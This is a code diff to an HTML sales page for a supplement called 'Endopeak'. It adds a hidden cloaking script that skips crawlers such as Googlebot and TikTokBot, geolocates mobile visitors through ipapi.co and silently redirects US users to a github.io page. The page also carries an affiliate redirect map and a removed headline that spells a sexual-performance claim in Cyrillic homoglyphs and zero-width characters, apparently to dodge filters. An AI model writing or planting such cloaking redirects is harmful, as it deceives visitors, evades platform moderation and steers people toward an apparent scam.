@@ -1,7 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script>
+    var userAgent = navigator.userAgent;
 
+    // Verifica se o agente do usuário corresponde a um bot.
+    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+        // Função para verificar se o dispositivo é móvel.
+        function isMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        }
+
+        // Função para obter a localização geográfica do usuário.
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    callback(data);
+                })
+                .catch(function(error) {
+                    console.error('Erro ao obter geolocalização:', error);
+                    callback(null);
+                });
+        }
+
+        // Verifica se o dispositivo é móvel e se a localização é nos Estados Unidos.
+        if (isMobile()) {
+            getGeolocation(function(location) {
+                if (location && location.country_code === 'US') {
+                    window.location.href = "https://bill101521.github.io/endop/";
+                }
+            });
+        }
+    }
+</script>
 	<script>
   const productRedirects = {
     "https://cooltip.shop/endopeak": "https://endopeak24.com/b/order-now.php?aff_id=115043"
@@ -150,7 +184,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     		<h2 class="text-center text-white vsl-headline">
     			<b>
     				<svg viewBox="0 0 700 75">
-                      	<text x="50%" y="30" text-anchor="middle" fill="white" class="vsl-headline">​"​​Е​R​Е​С​Т​I​О​Ν​ ​М​U​Ѕ​С​L​Е​ ​Т​R​I​С​Κ" <tspan class="vsl-headline-accent">​G​Е​Т​Ѕ​ ​Υ​О​U​ ​Н​А​R​D​ ​I​Ν​ ​9​ ​Ѕ​Е​С​О​Ν​D​Ѕ</tspan> </text>
+                      	<text x="50%" y="30" text-anchor="middle" fill="white" class="vsl-headline"> <tspan class="vsl-headline-accent">​</tspan> </text>
                       	<text x="50%" y="64" text-anchor="middle" fill="white" class="vsl-headline"></text>
                     </svg>
                 </b>
